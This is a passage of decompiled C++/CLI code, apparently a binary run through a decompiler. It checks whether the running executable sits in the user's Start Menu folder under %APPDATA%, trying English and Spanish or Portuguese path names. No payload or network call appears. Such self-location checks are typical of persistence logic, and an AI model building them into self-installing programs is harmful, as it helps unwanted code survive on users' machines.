    \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT2, allocatorWcharTPtr);
    void* voidPtr = \u003CModule\u003E.@new(4U);
    _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
    vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
    _Aux_cont* auxContPtr2;
    // ISSUE: fault handler
    try
    {
      if ((IntPtr) voidPtr != IntPtr.Zero)
      {
        *(int*) voidPtr = (int) &stdAllocatorWcharT1;
        auxContPtr2 = (_Aux_cont*) voidPtr;
      }
      else
        auxContPtr2 = (_Aux_cont*) 0;
    }
    __fault
    {
      \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref stdAllocatorWcharT1 = (int) auxContPtr2;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT1 + 8), allocatorWcharTPtr);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    // ISSUE: fault handler
    try
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) = 0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 20) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
    // ISSUE: fault handler
    try
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      int num1 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
      uint moduleFileNameW;
      do
      {
        uint _Newsize = (uint) (num1 + 260);
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, _Newsize, char.MinValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1);
        moduleFileNameW = \u003CModule\u003E.GetModuleFileNameW((HINSTANCE__*) 0, \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(&stdAllocatorWcharT1, 0U), num2);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        num1 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
      }
      while (moduleFileNameW >= (uint) num1);
      \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, moduleFileNameW, char.MinValue);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      char* chPtr1 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
        \u003CModule\u003E._invalid_parameter_noinfo();
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT2 = ^(int&) ref stdAllocatorWcharT1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) = (int) chPtr1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      char* chPtr2 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
        \u003CModule\u003E._invalid_parameter_noinfo();
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT3 = ^(int&) ref stdAllocatorWcharT1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT3 + 4) = (int) chPtr2;
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last1 = stdAllocatorWcharT2;
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First1 = stdAllocatorWcharT3;
      allocator\u003Cchar\u003E allocatorChar1;
      \u003CModule\u003E.std\u002E_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) &stdAllocatorChar1, \u003CModule\u003E.std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(&allocatorChar1));
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorChar1, false, 0U);
      forward_iterator_tag __unnamed002_1;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(&stdAllocatorChar1, _First1, _Last1, __unnamed002_1);
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr3 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref stdAllocatorWcharT4 = ^(int&) ref stdAllocatorWcharT1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 4) = (int) chPtr3;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr4 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT5;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref stdAllocatorWcharT5 = ^(int&) ref stdAllocatorWcharT1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT5 + 4) = (int) chPtr4;
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last2 = stdAllocatorWcharT4;
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First2 = stdAllocatorWcharT5;
        allocator\u003Cchar\u003E allocatorChar2;
        \u003CModule\u003E.std\u002E_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) &stdAllocatorChar2, \u003CModule\u003E.std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(&allocatorChar2));
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorChar2, false, 0U);
        forward_iterator_tag __unnamed002_2;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(&stdAllocatorChar2, _First2, _Last2, __unnamed002_2);
        // ISSUE: fault handler
        try
        {
          uint lastOf = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Efind_last_of(&stdAllocatorChar2, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040, *\u003CModule\u003E.__imp_\u003Fnpos\u0040\u003F\u0024basic_string\u0040DU\u003F\u0024char_traits\u0040D\u0040std\u0040\u0040V\u003F\u0024allocator\u0040D\u00402\u0040\u0040std\u0040\u00402IB);
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Esubstr(&stdAllocatorChar2, &stdAllocatorChar3, 0U, lastOf);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar4, 3, 1);
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar5, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar5);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar4 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0CP\u0040LIECOMAC\u0040\u003F2Microsoft\u003F2Windows\u003F2Start\u003F5Menu\u003F2Pr\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar6);
              bool flag;
              // ISSUE: fault handler
              try
              {
                flag = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr, &stdAllocatorChar3);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
              if (!flag)
                goto label_41;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar4);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return false;
label_41:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar7, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar7);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar7);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar7);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar4 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0DG\u0040CIHAFKCE\u0040\u003F2Microsoft\u003F2Windows\u003F2Menu\u003F5Iniciar\u003F2\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar8);
              bool flag;
              // ISSUE: fault handler
              try
              {
                flag = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr, &stdAllocatorChar3);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
              if (!flag)
                goto label_58;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar4);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return false;
label_58:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar9, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar9);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar9);
              }
